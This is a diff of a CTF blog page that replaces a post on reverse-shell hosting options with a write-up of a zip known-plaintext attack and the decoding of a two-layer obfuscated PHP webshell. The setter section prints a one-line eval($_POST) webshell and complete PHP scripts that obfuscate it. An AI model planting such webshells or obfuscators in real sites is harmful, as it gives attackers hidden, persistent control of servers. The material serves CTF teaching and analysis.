@@ -5,15 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>无公网服务器弹shell解决方案 - glan&#39;s blog</title>
+    <title>2023春秋杯冬季赛--明文混淆 - glan&#39;s blog</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="glan Obsidian hack 网安 ctf,"> 
-    <meta name="description" content="ctf 个人博客 glan blog hack the world 个人成长日记,最近vps过期了，打比赛和渗透的时候突然要用就很不方便。
-
-一：现买但是有可能商家会跑路。而且一下子买一个月，后面还不用就很可惜。
-二：Hello_CTF-Shell简介：合法反弹shell一站式最,"> 
+    <meta name="description" content="ctf 个人博客 glan blog hack the world 个人成长日记,解题思路方法一（成功率较低）：明文攻击解压缩包，license找到文件大小最相近的进行明文攻击。 对比大小后最可能的是gpl-3.0协议。 https://choosealicense.com/li,"> 
     <meta name="author" content="glan"> 
     <link rel="alternative" href="atom.xml" title="glan&#39;s blog" type="application/atom+xml"> 
     <link rel="icon" href="/img/tou.png"> 
@@ -77,7 +74,7 @@
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="/img/tou.png" alt="" data-url="https://g1an123.github.io">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">无公网服务器弹shell解决方案</h3>
+        <h3 class="subtitle">2023春秋杯冬季赛--明文混淆</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -107,29 +104,29 @@
         <div class="else">
             <p class="animated fadeInDown">
                 
-                <a href="/categories/杂七杂八"><b>「
-                    </b>杂七杂八<b> 」</b></a>
+                <a href="/categories/ctf"><b>「
+                    </b>CTF<b> 」</b></a>
                 
                 一月 30, 2024
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/2024/01/30/%E6%97%A0%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%B9shell%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" title="无公网服务器弹shell解决方案" class="">无公网服务器弹shell解决方案</a>
+            <h3 class="post-title animated fadeInDown"><a href="/2024/01/30/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B--%E6%98%8E%E6%96%87%E6%B7%B7%E6%B7%86/" title="2023春秋杯冬季赛--明文混淆" class="">2023春秋杯冬季赛--明文混淆</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    1.2k
+                    8k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    1 mins.
+                    7 mins.
                 </span>
                 
                 
-                <span id="/2024/01/30/无公网服务器弹shell解决方案/" class="leancloud_visitors" data-flag-title="无公网服务器弹shell解决方案">
+                <span id="/2024/01/30/2023春秋杯冬季赛--明文混淆/" class="leancloud_visitors" data-flag-title="2023春秋杯冬季赛--明文混淆">
                     <b class="iconfont icon-read"></b> <i>阅读次数</i>
                     <span class="leancloud-visitors-count">1000000</span>
                 </span>
@@ -138,7 +135,7 @@
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/tips/" rel="tag">tips</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
             
         </div>
     </div>
@@ -159,12 +156,115 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <pre><code>最近vps过期了，打比赛和渗透的时候突然要用就很不方便。
+            <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="方法一（成功率较低）："><a href="#方法一（成功率较低）：" class="headerlink" title="方法一（成功率较低）："></a>方法一（成功率较低）：</h2><p>明文攻击解压缩包，license找到文件大小最相近的进行明文攻击。 对比大小后最可能的是gpl-3.0协议。 <a target="_blank" rel="noopener" href="https://choosealicense.com/licenses/gpl-3.0/#">https://choosealicense.com/licenses/gpl-3.0/#</a> bkcrack明文攻击压缩包得到混淆webshell。 <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041706908.png"> <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041706628.png"></p>
+<h2 id="方法二（部分明文攻击，成功率较高）："><a href="#方法二（部分明文攻击，成功率较高）：" class="headerlink" title="方法二（部分明文攻击，成功率较高）："></a>方法二（部分明文攻击，成功率较高）：</h2><p>删掉大部分明文，只留下标题附近那一段进行部分明文攻击。<br>图忘截了。🤦‍♂️</p>
+<h1 id="两层混淆解密"><a href="#两层混淆解密" class="headerlink" title="两层混淆解密"></a>两层混淆解密</h1><p>参考文章:<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/147.html">https://blog.zgsec.cn/archives/147.html</a></p>
+<h2 id="o00o0o嵌套加密"><a href="#o00o0o嵌套加密" class="headerlink" title="o00o0o嵌套加密"></a>o00o0o嵌套加密</h2><p>打印eval执行函数得到是base64_decode函数 解密base64 <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707448.png"> 使用echo输出</p>
+<pre><code class="php">&lt;?php    
+$O00OO0=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);    
+$O00O0O=$O00OO0&#123;3&#125;.$O00OO0&#123;6&#125;.$O00OO0&#123;33&#125;.$O00OO0&#123;30&#125;;$O0OO00=$O00OO0&#123;33&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;;$OO0O00=$O0OO00&#123;0&#125;.$O00OO0&#123;18&#125;.$O00OO0&#123;3&#125;.$O0OO00&#123;0&#125;.$O0OO00&#123;1&#125;.$O00OO0&#123;24&#125;;$OO0000=$O00OO0&#123;7&#125;.$O00OO0&#123;13&#125;;$O00O0O.=$O00OO0&#123;22&#125;.$O00OO0&#123;36&#125;.$O00OO0&#123;29&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;.$O00OO0&#123;32&#125;.$O00OO0&#123;35&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;;    
+    
+$O0O000=&quot;NoJpuRUVQdeXLBwFaEvMPhtCIxlAYrHDsOynWScjTKkZgmbqGifzkLexbWjMsNrBOgcRInyZCdaAzEqUfvJDGTtuwQFKhiVmSXPoYlpHCD9cIJUimBmdPAdurXqbmXEdNYjLfXRHmhf0B2Wqf29VmQSuMhguNRZ4rqeKWVkiWA9gjnWyPRNjTJWiMnG4Nj5HN3s4WnNCFuxeF2qzmVqhkYa2huxmruxMIKR5MVmMMVa4MXL5MHg0FXknsjn9CQFxiQV7zUL/CS==&quot;;    
+echo htmlspecialchars(&#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));    
+?&gt;
 </code></pre>
-<h2 id="一：现买"><a href="#一：现买" class="headerlink" title="一：现买"></a>一：现买</h2><p>但是有可能商家会跑路。而且一下子买一个月，后面还不用就很可惜。</p>
-<h2 id="二：Hello-CTF-Shell"><a href="#二：Hello-CTF-Shell" class="headerlink" title="二：Hello_CTF-Shell"></a>二：Hello_CTF-Shell</h2><p><strong>简介</strong>：合法反弹shell一站式最廉价解决方案！！！！（绑腾讯云服务器，加一下snapshot方便一些）<br><a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/Hello_CTF-Shell?tab=readme-ov-file">https://github.com/ProbiusOfficial/Hello_CTF-Shell?tab=readme-ov-file</a></p>
-<h2 id="三：SakuraFrp"><a href="#三：SakuraFrp" class="headerlink" title="三：SakuraFrp"></a>三：SakuraFrp</h2><p><strong>简介</strong>：用来反弹shell和简单的渗透基本够用。主要是免费（一块钱实名认证费，不能拿来干坏事了🥹）。<br><strong>适合人群</strong>：长期不用，时不时用一下，或者有些工具不方便在服务器上装的。<br><strong>教程</strong>：<br><a target="_blank" rel="noopener" href="https://jlan.darkflow.top/posts/23df454a.html">https://jlan.darkflow.top/posts/23df454a.html</a></p>
-<h2 id="其他也许有用："><a href="#其他也许有用：" class="headerlink" title="其他也许有用："></a>其他也许有用：</h2><p>CTF比赛中，一键将本地运行的EXP反弹到VPS端口<br><a target="_blank" rel="noopener" href="https://blog.chara.pub/2023/05/02/ctf-publish-port-with-frp/">https://blog.chara.pub/2023/05/02/ctf-publish-port-with-frp/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707047.png"></p>
+<p>得到第二层加密密文</p>
+<pre><code class="php">?&gt;&lt;?php eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;))); ?&gt;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707601.png"></p>
+<h2 id="简单的Gzip-Base64加密"><a href="#简单的Gzip-Base64加密" class="headerlink" title="简单的Gzip+Base64加密"></a>简单的Gzip+Base64加密</h2><p>直接使用曾哥写好的解密脚本梭哈。 解密脚本：</p>
+<pre><code class="php">&lt;?php    
+//放入已经加密的PHP内容    
+$a = &quot;eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;)));&quot;;    
+function decodephp($a)    
+&#123;    
+    $max_level = 300; //最大层数    
+    for ($i = 0; $i &lt; $max_level; $i++) &#123;    
+        ob_start();    
+        eval(str_replace(&#39;eval&#39;, &#39;echo&#39;, $a));    
+        $a = ob_get_clean();    
+        if (strpos($a, &#39;eval(gzinflate(base64_decode&#39;) === false) &#123;    
+            return $a;    
+        &#125;    
+    &#125;&#125;    
+//这里注意要加htmlspecialchars，我看好多文章没写    
+echo htmlspecialchars(decodephp($a));    
+?&gt;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707127.png"> 得到flag <code>flag&#123;s1mpL3_z1p_@nd_w365heLl!!!&#125;</code></p>
+<h1 id="出题思路："><a href="#出题思路：" class="headerlink" title="出题思路："></a>出题思路：</h1><h1 id="webshell加密"><a href="#webshell加密" class="headerlink" title="webshell加密"></a>webshell加密</h1><p>第一层：简单的Gzip+Base64加密<br>我们先新建一个PHP文件，名字为 <code>phpinfo.php</code></p>
+<pre><code class="php">&lt;?php  
+eval(@$_POST[&#39;flag&#123;s1mpL3_z1p_@nd_w365heLl!!!&#125;&#39;]); ?&gt;
+</code></pre>
+<p>然后我们再新建一个PHP文件，名字为 <code>encipher.php</code> ，放入以下代码并保存：</p>
+<pre><code class="php">&lt;?php
+function encode_file_contents($filename) &#123;
+    $type=strtolower(substr(strrchr($filename,&#39;.&#39;),1));
+    if(&#39;php&#39;==$type &amp;&amp; is_file($filename) &amp;&amp; is_writable($filename)) &#123;
+        // 如果是PHP文件 并且可写 则进行压缩编码
+        $contents = file_get_contents($filename);
+        // 判断文件是否已经被编码处理
+        $pos = strpos($contents,&#39;/*Protected by AabyssZG*/&#39;);
+        if(false === $pos || $pos&gt;100) &#123;
+            // 去除PHP文件注释和空白，减少文件大小
+            $contents = php_strip_whitespace($filename);
+            // 去除PHP头部和尾部标识
+            $headerPos = strpos($contents,&#39;&lt;?php&#39;);
+            $footerPos = strrpos($contents,&#39;?&gt;&#39;);
+            $contents = substr($contents,$headerPos+5,$footerPos-$headerPos);
+            $encode = base64_encode(gzdeflate($contents));
+            // 开始编码
+            $encode = &#39;&lt;?php&#39;.&quot; /*Protected by AabyssZG*/\neval(gzinflate(base64_decode(&#39;&quot;.$encode.&quot;&#39;))); \n?&gt;&quot;;
+            return file_put_contents($filename,$encode);
+        &#125;
+    &#125;
+    return false;
+&#125;
+//调用函数
+$filename=&#39;phpinfo.php&#39;;
+//这里填入需要加密的原始PHP文件名
+encode_file_contents($filename);
+?&gt;
+</code></pre>
+<p>第二层： o00o0o嵌套加密</p>
+<pre><code class="php">&lt;?php
+function RandAbc($length=&quot;&quot;)&#123;//返回随机字符串
+$str=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;
+return str_shuffle($str);
+&#125;
+
+$filename=&#39;phpinfo.php&#39;;  //这里填入需要加密的原始PHP文件名
+$T_k1=RandAbc();//随机密匙1
+$T_k2=RandAbc();//随机密匙2
+
+$vstr=file_get_contents($filename);//要加密的文件
+
+$v1=base64_encode($vstr);
+$c=strtr($v1,$T_k1,$T_k2);//根据密匙替换对应字符。
+$c=$T_k1.$T_k2.$c;
+
+$q1=&quot;O00O0O&quot;;
+$q2=&quot;O0O000&quot;;
+$q3=&quot;O0OO00&quot;;
+$q4=&quot;OO0O00&quot;;
+$q5=&quot;OO0000&quot;;
+$q6=&quot;O00OO0&quot;;
+
+$s=&#39;$&#39;.$q6.&#39;=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$&#39;.$q1.&#39;=$&#39;.$q6.&#39;&#123;3&#125;.$&#39;.$q6.&#39;&#123;6&#125;.$&#39;.$q6.&#39;&#123;33&#125;.$&#39;.$q6.&#39;&#123;30&#125;;$&#39;.$q3.&#39;=$&#39;.$q6.&#39;&#123;33&#125;.$&#39;.$q6.&#39;&#123;10&#125;.$&#39;.$q6.&#39;&#123;24&#125;.$&#39;.$q6.&#39;&#123;10&#125;.$&#39;.$q6.&#39;&#123;24&#125;;$&#39;.$q4.&#39;=$&#39;.$q3.&#39;&#123;0&#125;.$&#39;.$q6.&#39;&#123;18&#125;.$&#39;.$q6.&#39;&#123;3&#125;.$&#39;.$q3.&#39;&#123;0&#125;.$&#39;.$q3.&#39;&#123;1&#125;.$&#39;.$q6.&#39;&#123;24&#125;;$&#39;.$q5.&#39;=$&#39;.$q6.&#39;&#123;7&#125;.$&#39;.$q6.&#39;&#123;13&#125;;$&#39;.$q1.&#39;.=$&#39;.$q6.&#39;&#123;22&#125;.$&#39;.$q6.&#39;&#123;36&#125;.$&#39;.$q6.&#39;&#123;29&#125;.$&#39;.$q6.&#39;&#123;26&#125;.$&#39;.$q6.&#39;&#123;30&#125;.$&#39;.$q6.&#39;&#123;32&#125;.$&#39;.$q6.&#39;&#123;35&#125;.$&#39;.$q6.&#39;&#123;26&#125;.$&#39;.$q6.&#39;&#123;30&#125;;eval($&#39;.$q1.&#39;(&quot;&#39;.base64_encode(&#39;$&#39;.$q2.&#39;=&quot;&#39;.$c.&#39;&quot;;eval(\&#39;?&gt;\&#39;.$&#39;.$q1.&#39;($&#39;.$q3.&#39;($&#39;.$q4.&#39;($&#39;.$q2.&#39;,$&#39;.$q5.&#39;*2),$&#39;.$q4.&#39;($&#39;.$q2.&#39;,$&#39;.$q5.&#39;,$&#39;.$q5.&#39;),$&#39;.$q4.&#39;($&#39;.$q2.&#39;,0,$&#39;.$q5.&#39;))));&#39;).&#39;&quot;));&#39;;
+
+$s=&#39;&lt;?php
+&#39;.$s.&#39;
+?&gt;&#39;;
+
+echo $s;
+
+//生成 加密后的PHP文件
+$fpp1=fopen(&#39;temp&#39;.$filename,&#39;w&#39;);
+fwrite($fpp1,$s) or die(&#39;写文件错误&#39;);
+?&gt;
+</code></pre>
+<h1 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h1><p>license文件用gpl3.0协议。<br><a target="_blank" rel="noopener" href="https://choosealicense.com/licenses/gpl-3.0/#">https://choosealicense.com/licenses/gpl-3.0/#</a><br>,然后与加密后的webshell放在一个文件夹内。<br>使用2345快压进行压缩，压缩方法使用压缩，强密码加密。<br>密码：R05VIEdQTHYz<br>（base64加密后改了一部分doge）</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -222,7 +322,7 @@
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>目录</h4>
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E7%8E%B0%E4%B9%B0"><span class="toc-number">1.</span> <span class="toc-text">一：现买</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9AHello-CTF-Shell"><span class="toc-number">2.</span> <span class="toc-text">二：Hello_CTF-Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%9ASakuraFrp"><span class="toc-number">3.</span> <span class="toc-text">三：SakuraFrp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%B9%9F%E8%AE%B8%E6%9C%89%E7%94%A8%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">其他也许有用：</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%88%E6%88%90%E5%8A%9F%E7%8E%87%E8%BE%83%E4%BD%8E%EF%BC%89%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">方法一（成功率较低）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%88%E9%83%A8%E5%88%86%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB%EF%BC%8C%E6%88%90%E5%8A%9F%E7%8E%87%E8%BE%83%E9%AB%98%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">方法二（部分明文攻击，成功率较高）：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%A4%E5%B1%82%E6%B7%B7%E6%B7%86%E8%A7%A3%E5%AF%86"><span class="toc-number">2.</span> <span class="toc-text">两层混淆解密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#o00o0o%E5%B5%8C%E5%A5%97%E5%8A%A0%E5%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">o00o0o嵌套加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84Gzip-Base64%E5%8A%A0%E5%AF%86"><span class="toc-number">2.2.</span> <span class="toc-text">简单的Gzip+Base64加密</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">出题思路：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E5%8A%A0%E5%AF%86"><span class="toc-number">4.</span> <span class="toc-text">webshell加密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9"><span class="toc-number">5.</span> <span class="toc-text">压缩</span></a></li></ol>
                 </div>
             </div>
             
